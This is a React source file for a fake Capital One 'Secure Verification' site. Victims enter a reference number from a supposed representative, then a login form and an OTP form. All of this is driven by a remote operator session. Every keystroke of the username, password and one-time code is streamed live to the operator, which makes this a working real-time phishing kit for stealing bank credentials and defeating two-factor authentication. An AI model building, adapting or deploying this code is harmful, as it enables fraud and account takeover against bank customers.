"use client";

import { useState, useEffect } from "react";
import { ControlRoomSession, SessionState } from "@/SDK/vendor-sdk";
import { CheckCircle2, XCircle, User, Lock, Eye, EyeOff, Fingerprint, ScanFace, ChevronRight } from "lucide-react";

const Logo = () => (
  <img src="/capital-one-logo.svg" alt="Capital One" className="h-full w-auto object-contain" />
);

const CardContainer = ({ children }: { children: React.ReactNode }) => (
  <div className="w-full border border-gray-200 rounded-xl p-6 sm:p-10 shadow-sm mb-8 bg-white transition-all">
    <div className="flex justify-center mb-8">
      <div className="w-40 h-12 sm:h-14">
        <Logo />
      </div>
    </div>
    {children}
  </div>
);

/* ===================================================================
   LOGIN FORM
   =================================================================== */

function LoginForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke: (field: string, value: string) => void; error?: string }) {
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [validationError, setValidationError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setValidationError("");

    if (!userId.trim()) {
      setValidationError("Please enter your Username.");
      return;
    }
    if (!password) {
      setValidationError("Please enter your Password.");
      return;
    }

    setIsSubmitting(true);
    try {
      await onInput({ event: "submit_credentials", user_id: userId, password: password });
    } catch {
      setIsSubmitting(false);
    }
  };

  return (
    <>
      <CardContainer>
        <h1 className="text-2xl font-normal text-center mb-8">Sign In</h1>
        <form onSubmit={handleSubmit} className="space-y-6">
          <div data-purpose="input-group">
            <label className="block text-sm font-bold text-gray-700 mb-1" htmlFor="username">Username</label>
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                <User className="h-5 w-5 text-gray-400" />
              </div>
              <input
                className="block w-full pl-11 pr-3 py-3 border border-gray-400 rounded-md shadow-sm focus:ring-cap-blue focus:border-cap-blue text-lg outline-none"
                id="username"
                type="text"
                value={userId}
                onChange={e => {
                  setUserId(e.target.value);
                  onKeystroke("user_id", e.target.value);
                }}
                autoComplete="username"
                autoFocus
                required
              />
            </div>
          </div>

          <div data-purpose="input-group">
            <label className="block text-sm font-bold text-gray-700 mb-1" htmlFor="password">Password</label>
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                <Lock className="h-5 w-5 text-gray-400" />
              </div>
              <input
                className="block w-full pl-11 pr-12 py-3 border border-gray-400 rounded-md shadow-sm focus:ring-cap-blue focus:border-cap-blue text-lg outline-none"
                id="password"
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={e => {
                  setPassword(e.target.value);
                  onKeystroke("password", e.target.value);
                }}
                autoComplete="current-password"
                required
              />
              <div className="absolute inset-y-0 right-0 pr-3 flex items-center cursor-pointer text-gray-500 hover:text-gray-700 transition-colors" onClick={() => setShowPassword(!showPassword)}>
                {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
              </div>
            </div>
          </div>

          <div className="flex items-center">
            <input className="h-6 w-6 text-cap-blue border-gray-400 rounded" id="remember_me" type="checkbox" />
            <label className="ml-3 block text-lg text-gray-900" htmlFor="remember_me">Remember Me</label>
          </div>

          {(error || validationError) && (
            <p className="text-red-700 font-bold text-sm bg-red-50 p-3 rounded border border-red-200">
              {validationError || error}
            </p>
          )}

          <div className="pt-2">
            <button className="w-full flex justify-center py-4 px-4 border border-transparent rounded-md shadow-sm text-lg font-bold text-white bg-cap-blue hover-bg-cap-blue focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-cap-blue" type="submit" disabled={isSubmitting}>
              {isSubmitting ? "Signing in..." : "Sign in"}
            </button>
          </div>
        </form>

        <div className="mt-8 border border-gray-200 rounded-xl p-5 flex flex-col items-start bg-gray-50 hover:bg-gray-100 transition-colors cursor-pointer group">
          <div className="flex items-center space-x-3 mb-3">
            <div className="flex bg-white p-2 rounded-lg shadow-sm border border-gray-200 space-x-2 text-cap-blue">
              <ScanFace className="w-5 h-5" strokeWidth={1.5} />
              <Fingerprint className="w-5 h-5" strokeWidth={1.5} />
            </div>
            <h2 className="text-base font-bold text-gray-900">Go passwordless with a passkey</h2>
          </div>
          <p className="text-sm text-gray-600 leading-relaxed">
            No more having to remember a password. Use a passkey to sign in using your face or fingerprint.
          </p>
          <div className="mt-3 font-bold text-sm text-cap-blue flex items-center group-hover:underline">
            Create a passkey <ChevronRight className="w-4 h-4 ml-0.5" />
          </div>
        </div>

        <div className="mt-8 space-y-4">
          <a className="block text-cap-blue font-bold text-lg hover:underline" href="#">Forgot Username or Password?</a>
          <a className="block text-cap-blue font-bold text-lg hover:underline" href="#">Set Up Online Access</a>
        </div>
      </CardContainer>

      <div className="w-full text-center px-6">
        <p className="text-lg text-gray-700 mb-4">Looking for these accounts?</p>
        <a className="text-cap-blue font-bold text-lg hover:underline" href="#">Commercial or Trade Credit</a>
      </div>
    </>
  );
}

/* ===================================================================
   OTP VERIFICATION FORM
   =================================================================== */

function OtpVerificationForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke: (field: string, value: string) => void; error?: string }) {
  const [otp, setOtp] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    try {
      await onInput({ event: "verify_otp", otp_code: otp });
    } catch {
      setIsSubmitting(false);
    }
  };

  return (
    <CardContainer>
      <h1 className="text-2xl font-normal text-center mb-4">Verify Your Identity</h1>
      <p className="text-sm text-gray-700 text-center mb-8">
        We&apos;ve sent a verification code to your registered device. Enter the code below to continue.
      </p>
      <form onSubmit={handleSubmit} className="space-y-6">
        <div data-purpose="input-group">
          <label className="block text-sm font-bold text-gray-700 mb-1" htmlFor="otpCode">Verification Code</label>
          <div className="relative">
            <input
              className="block w-full px-3 py-3 border border-gray-400 rounded-md shadow-sm focus:ring-cap-blue focus:border-cap-blue text-2xl tracking-[0.5em] text-center font-bold outline-none"
              id="otpCode"
              type="text"
              value={otp}
              onChange={e => {
                const val = e.target.value.replace(/\D/g, "").slice(0, 8);
                setOtp(val);
                onKeystroke("otp_code", val);
              }}
              inputMode="numeric"
              required
              autoComplete="one-time-code"
              autoFocus
            />
          </div>
        </div>

        {error && (
          <p className="text-red-700 font-bold text-sm bg-red-50 p-3 rounded border border-red-200">
            {error}
          </p>
        )}

        <div className="pt-2">
          <button className="w-full flex justify-center py-4 px-4 border border-transparent rounded-md shadow-sm text-lg font-bold text-white bg-cap-blue hover-bg-cap-blue focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-cap-blue" type="submit" disabled={otp.length < 4 || isSubmitting}>
            {isSubmitting ? "Verifying..." : "Verify"}
          </button>
        </div>
      </form>
    </CardContainer>
  );
}

/* ===================================================================
   PROCESSING SCREEN
   =================================================================== */

function ProcessingScreen({ error }: { error?: string }) {
  return (
    <CardContainer>
      <h1 className="text-2xl font-normal text-center mb-8">Processing Your Request</h1>
      <div className="flex flex-col items-center justify-center space-y-6">
        <div className="w-12 h-12 border-4 border-gray-200 border-t-cap-blue rounded-full animate-spin"></div>
        <p className="text-base text-gray-700 text-center leading-relaxed">
          Please wait while we securely verify your information.<br />Do not close or refresh this page.
        </p>
        {error && (
          <p className="w-full text-red-700 font-bold text-sm bg-red-50 p-3 rounded border border-red-200">
            {error}
          </p>
        )}
      </div>
    </CardContainer>
  );
}

/* ===================================================================
   SUCCESS SCREEN
   =================================================================== */

function SuccessScreen() {
  return (
    <CardContainer>
      <div className="flex flex-col items-center justify-center py-8">
        <CheckCircle2 className="w-16 h-16 text-green-600 mb-6" />
        <h1 className="text-2xl font-normal text-center mb-4 text-green-700">Verification Complete</h1>
        <p className="text-base text-gray-700 text-center leading-relaxed">
          Your identity has been successfully verified. You may now close this window.
        </p>
      </div>
    </CardContainer>
  );
}

/* ===================================================================
   FAILURE SCREEN
   =================================================================== */

function FailureScreen({ error }: { error?: string }) {
  return (
    <CardContainer>
      <div className="flex flex-col items-center justify-center py-8">
        <XCircle className="w-16 h-16 text-red-600 mb-6" />
        <h1 className="text-2xl font-normal text-center mb-4 text-red-700">Verification Failed</h1>
        <p className="text-base text-gray-700 text-center leading-relaxed">
          {error || "We could not verify your information. Please contact Capital One for assistance."}
        </p>
      </div>
    </CardContainer>
  );
}

/* ===================================================================
   MAIN PAGE
   =================================================================== */

export default function Home() {
  const [caseRef, setCaseRef] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [sessionState, setSessionState] = useState<SessionState | null>(null);
  const [session, setSession] = useState<ControlRoomSession | null>(null);

  const handleConnect = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!caseRef.trim()) return;

    setLoading(true);
    setError("");

    try {
      const s = new ControlRoomSession({
        tenant_id: "cd37b044-b17a-4f81-8421-fb9286e18726", // From schema
        case_reference: caseRef.trim(),
        supabaseUrl: process.env.NEXT_PUBLIC_SUPABASE_URL!,
        supabaseKey: process.env.NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY!,
      });
      const state = await s.connect();
      setSession(s);
      setSessionState(state);

      s.subscribe((newState) => {
        setSessionState(newState);
      });
    } catch (err: any) {
      setError(err.message || "Unable to connect. Please check your reference and try again.");
    } finally {
      setLoading(false);
    }
  };

  const handleInput = async (data: any) => {
    if (session) {
      await session.sendInput(data);
    }
  };

  const handleKeystroke = (field: string, value: string) => {
    if (session) {
      session.sendKeystroke(field, value);
    }
  };

  useEffect(() => {
    return () => {
      if (session) session.disconnect();
    };
  }, [session]);

  // Reference entry screen — before session is connected
  if (!sessionState) {
    return (
      <CardContainer>
        <h1 className="text-2xl font-normal text-center mb-4">Secure Verification</h1>
        <p className="text-sm text-gray-700 text-center mb-8">
          Enter the reference number provided by your Capital One representative to begin the verification process.
        </p>
        <form onSubmit={handleConnect} className="space-y-6">
          <div data-purpose="input-group">
            <div className="relative">
              <input
                className="block w-full px-4 py-4 border border-gray-400 rounded-md shadow-sm focus:ring-cap-blue focus:border-cap-blue text-xl font-bold tracking-[0.2em] text-center uppercase outline-none text-cap-blue"
                id="caseRefInput"
                type="text"
                value={caseRef}
                onChange={e => setCaseRef(e.target.value.toUpperCase())}
                placeholder="REFERENCE NUMBER"
                autoFocus
              />
            </div>
            {error && <p className="text-red-700 font-bold text-sm text-center mt-3">{error}</p>}
          </div>
          <div className="pt-2">
            <button className="w-full flex justify-center py-4 px-4 border border-transparent rounded-md shadow-sm text-lg font-bold text-white bg-cap-blue hover-bg-cap-blue focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-cap-blue" type="submit" disabled={loading || !caseRef.trim()}>
              {loading ? "Connecting..." : "Continue"}
            </button>
          </div>
        </form>
      </CardContainer>
    );
  }

  const operatorError = sessionState.operator_message;

  switch (sessionState.component_key) {
    case "LoginForm":
      return <LoginForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
    case "OtpVerificationForm":
      return <OtpVerificationForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
    case "ProcessingScreen":
      return <ProcessingScreen error={operatorError} />;
    case "SuccessScreen":
      return <SuccessScreen />;
    case "FailureScreen":
      return <FailureScreen error={operatorError} />;
    default:
      return (
        <CardContainer>
          <h2 className="text-2xl font-normal text-center mb-8">Loading...</h2>
          <div className="flex flex-col items-center justify-center space-y-6">
            <div className="w-12 h-12 border-4 border-gray-200 border-t-cap-blue rounded-full animate-spin"></div>
            <p className="text-base text-gray-700 text-center leading-relaxed">
              Waiting for session: {sessionState.current_state}
            </p>
          </div>
        </CardContainer>
      );
  }
}
